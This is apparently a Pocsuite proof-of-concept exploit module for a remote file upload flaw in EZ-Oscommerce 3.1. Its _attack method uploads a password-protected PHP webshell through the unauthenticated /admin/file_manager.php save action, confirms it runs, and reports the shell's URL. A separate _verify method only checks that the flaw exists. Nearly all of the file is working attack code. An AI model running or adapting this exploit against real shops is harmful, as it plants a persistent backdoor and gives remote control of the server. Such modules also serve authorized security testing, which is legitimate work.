#!/usr/bin/env python
# coding: utf-8
import string
import random
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
from pocsuite.lib.utils.webshell import PhpVerify, PhpShell
from pocsuite.lib.utils.password import genPassword


class TestPOC(POCBase):
    vulID = '69439'  # ssvid
    version = '1.0'
    author = ['0xFATeam']
    vulDate = ''
    createDate = '2016-01-16'
    updateDate = '2016-01-16'
    references = ['http://www.sebug.net/vuldb/ssvid-69439']
    name = 'EZ-Oscommerce 3.1 - Remote File Upload'
    appPowerLink = 'http://www.ezosc.com'
    appName = 'Oscommerce'
    appVersion = '3.1'
    vulType = 'File Upload'
    desc = '''
    '''
    samples = ['']

    def _attack(self):
        result = {}

        vul_url = '/admin/file_manager.php'
        params = {'action': 'save'}

        webshell = PhpShell()
        webshell.set_pwd(genPassword(6))
        filename = ''.join([random.choice(string.ascii_lowercase) for _ in range(6)]) + '.php'
        content = webshell.get_content()
        data = {
            'filename': filename,
            'file_contents': content,
            'submit': ''
        }

        req.post(self.url + vul_url, params=params, data=data)
        if webshell.check(self.url + ('/%s' % filename)):
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = self.url + ('/%s' % filename)
            result['ShellInfo']['Content'] = content

        return self.parse_output(result)

    def _verify(self):
        result = {}
        vul_url = '/admin/file_manager.php'
        params = {'action': 'save'}

        webshell = PhpVerify()
        filename = ''.join([random.choice(string.ascii_lowercase) for _ in range(6)]) + '.php'
        content = webshell.get_content()
        data = {
            'filename': filename,
            'file_contents': content,
            'submit': ''
        }

        response = req.post(self.url + vul_url, params=params, data=data)
        if webshell.check(self.url + ('/%s' % filename)):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = response.url

        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)